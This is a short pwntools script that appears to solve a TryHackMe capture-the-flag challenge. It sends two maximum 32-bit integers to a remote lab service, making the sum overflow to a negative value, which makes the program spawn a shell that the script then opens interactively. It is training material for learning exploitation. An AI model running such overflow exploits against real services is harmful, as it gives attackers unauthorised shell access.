# adds two numbers, neither of which can be negative.
# if the result is negative, pops a shell.
# as these are all 32 bit numbers, the max value 
# of the final int is 2147483647 before it wraps 
# to negative, so adding two of these will result in -2

from pwn import *

current_thmip = '10.10.134.184'

p = remote(current_thmip,9005)
# p = process("./pwn105.pwn105")

p.clean()
p.sendline(b'2147483647')
p.clean()
p.sendline(b'2147483647')
p.clean()
p.interactive()

